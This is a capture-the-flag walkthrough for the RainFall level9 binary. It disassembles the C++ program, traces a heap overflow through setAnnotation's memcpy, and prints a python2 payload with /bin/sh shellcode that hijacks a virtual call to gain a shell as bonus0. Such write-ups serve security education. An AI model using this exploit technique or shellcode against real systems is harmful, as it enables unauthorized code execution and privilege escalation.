# Walkthrough

i looked through the files in the home directory and found a binary file called 'level9'. When i executed it, i didn't see any visible changes. So i tried to run it again using the 'ltrace' command, both with and without arguments. Running it without arguments, i noticed that it exited with status 1. However, when i ran it with arguments, we could see that it calculated the length of the argument entered and copied the content of the address to another address.

```
level9@RainFall:~$ ltrace ./level9
__libc_start_main(0x80485f4, 1, 0xbffff6f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                                = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                             = 0
_exit(1 <unfinished ...>
+++ exited (status 1) +++
```

To better understand the code, i decided to debug it using 'gdb'. i started by listing the functions of the program, and it looked like it was written in C++.

```
level9@RainFall:~$ ltrace ./level9 AAAA
__libc_start_main(0x80485f4, 2, 0xbffff6e4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                                = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                             = 0
_Znwj(108, 0xbffff6e4, 0xbffff6f0, 0xb7d79e55, 0xb7fed280)                                                                        = 0x804a008
_Znwj(108, 5, 0xbffff6f0, 0xb7d79e55, 0xb7fed280)                                                                                 = 0x804a078
strlen("AAAA")                                                                                                                    = 4
memcpy(0x0804a00c, "AAAA", 4)                                                                                                     = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                                                           = 0xb7fce4a0
+++ exited (status 11) +++
```

i then disassembled the main function

```s
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>: push   ebp
   0x080485f5 <+1>: mov    ebp,esp
   0x080485f7 <+3>: push   ebx
   0x080485f8 <+4>: and    esp,0xfffffff0
   0x080485fb <+7>: sub    esp,0x20
   0x080485fe <+10>: cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>: jg     0x8048610 <main+28>
   0x08048604 <+16>: mov    DWORD PTR [esp],0x1
   0x0804860b <+23>: call   0x80484f0 <_exit@plt>
   0x08048610 <+28>: mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>: call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>: mov    ebx,eax
   0x0804861e <+42>: mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>: mov    DWORD PTR [esp],ebx
   0x08048629 <+53>: call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>: mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>: mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>: call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>: mov    ebx,eax
   0x08048640 <+76>: mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>: mov    DWORD PTR [esp],ebx
   0x0804864b <+87>: call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>: mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>: mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>: mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>: mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>: mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>: mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>: add    eax,0x4
   0x0804866a <+118>: mov    eax,DWORD PTR [eax]
   0x0804866c <+120>: mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>: mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>: mov    DWORD PTR [esp],eax
   0x08048677 <+131>: call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>: mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>: mov    eax,DWORD PTR [eax]
   0x08048682 <+142>: mov    edx,DWORD PTR [eax]
   0x08048684 <+144>: mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>: mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>: mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>: mov    DWORD PTR [esp],eax
   0x08048693 <+159>: call   edx
   0x08048695 <+161>: mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>: leave  
   0x08048699 <+165>: ret    
End of assembler dump.
```

it first checked if the number of arguments was greater than one. If it was false, it exited with a status of one.

```s
   0x080485fe <+10>: cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>: jg     0x8048610 <main+28>
   0x08048604 <+16>: mov    DWORD PTR [esp],0x1
   0x0804860b <+23>: call   0x80484f0 <_exit@plt>
```

If not, it allocated memory for the 'N' class and passed the number 5 to the constructor as a parameter. It then reallocated memory for the 'N' class again and passed the number 6 to the constructor as a parameter.

```s
   0x08048610 <+28>: mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>: call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>: mov    ebx,eax
   0x0804861e <+42>: mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>: mov    DWORD PTR [esp],ebx
   0x08048629 <+53>: call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>: mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>: mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>: call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>: mov    ebx,eax
   0x08048640 <+76>: mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>: mov    DWORD PTR [esp],ebx
   0x0804864b <+87>: call   0x80486f6 <_ZN1NC2Ei>
```

Next, it passed the second argument of main to the 'setAnnotation' method of the first class.

```s
   0x08048664 <+112>: mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>: add    eax,0x4
   0x0804866a <+118>: mov    eax,DWORD PTR [eax] // argv[1]
   0x0804866c <+120>: mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>: mov    eax,DWORD PTR [esp+0x14] // The address of the first allocated 'N' class.
   0x08048674 <+128>: mov    DWORD PTR [esp],eax
   0x08048677 <+131>: call   0x804870e <_ZN1N13setAnnotationEPc>
```

This method calculated the length of the parameter and used it in the 'memcpy' function, which took the address of an attribute in the class and the address of the parameter of main, along with the length of the second parameter as the last parameter.

```s
(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>: push   ebp
   0x0804870f <+1>: mov    ebp,esp
   0x08048711 <+3>: sub    esp,0x18
   0x08048714 <+6>: mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>: mov    DWORD PTR [esp],eax
   0x0804871a <+12>: call   0x8048520 <strlen@plt>
   0x0804871f <+17>: mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>: add    edx,0x4
   0x08048725 <+23>: mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>: mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>: mov    DWORD PTR [esp],edx
   0x08048733 <+37>: call   0x8048510 <memcpy@plt>
   0x08048738 <+42>: leave  
   0x08048739 <+43>: ret   
```

 Finally, the program attempted to call an address, which was the address of the 'operator+' function.

 ```s
  0x0804867c <+136>: mov    eax,DWORD PTR [esp+0x10] // 0x804a078
   0x08048680 <+140>: mov    eax,DWORD PTR [eax] // 0x0804873a
   0x08048682 <+142>: mov    edx,DWORD PTR [eax] // 0x8be58955 the address of the operator+
   0x08048684 <+144>: mov    eax,DWORD PTR [esp+0x14] // 0x804a008
   0x08048688 <+148>: mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>: mov    eax,DWORD PTR [esp+0x10] // 0x804a078
   0x08048690 <+156>: mov    DWORD PTR [esp],eax
   0x08048693 <+159>: call   edx // call the operator+
 ```

 This function added the number of the class passed to it with the number of the class that called this operator+:

 ```s
 (gdb) disas _ZN1NplERS_
Dump of assembler code for function _ZN1NplERS_:
   0x0804873a <+0>: push   ebp
   0x0804873b <+1>: mov    ebp,esp
   0x0804873d <+3>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048740 <+6>: mov    edx,DWORD PTR [eax+0x68]
   0x08048743 <+9>: mov    eax,DWORD PTR [ebp+0xc]
   0x08048746 <+12>: mov    eax,DWORD PTR [eax+0x68]
   0x08048749 <+15>: add    eax,edx
   0x0804874b <+17>: pop    ebp
   0x0804874c <+18>: ret  
 ```

 and the result of this method was returned in the return of the main function.

To begin, I will set a breakpoint at address 0x0804867c, which is the next instruction after the setAnnotation method. Then, I will display the heap.

```s
(gdb) b *0x0804867c
Breakpoint 2 at 0x804867c
(gdb) r AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level9/level9 AAAA
(gdb) x/76wx 0x804a000
0x804a000: 0x00000000 0x00000071 0x08048848 0x41414141
0x804a010: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a020: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a030: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a040: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a050: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a060: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a070: 0x00000005 0x00000071 0x08048848 0x00000000
0x804a080: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a090: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a0a0: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a0b0: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a0c0: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a0d0: 0x00000000 0x00000000 0x00000000 0x00000000
0x804a0e0: 0x00000006 0x00020f21 0x00000000 0x00000000
```

Next, I will modify the address of the operator+ function to point to my shell code by changing the value of address 0x804a078 to the address 0x804a00c. This will cause the value at the latter address `(0x804a010)` to be set to the address of my shell code.

```
>>> 0x804a078 - 0x804a00c
108
>>> 108 - 21 - 4 // The result of the last calculation  - The length of the shell code - The length of the address `0x804a010`
83
```

Then, i will use Python to generate the string that will overwrite the heap.

```sh
python2 -c 'print("\x08\x04\xa0\x10"[::-1] + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1])' > /tmp/flag
```

Now, all that is left to do is to run the program with the generated string.

```sh
level9@RainFall:~$ ./level9 `cat /tmp/flag`
$ whoami
bonus0
$ cd ../bonus0
$ ls -la
total 17
dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
```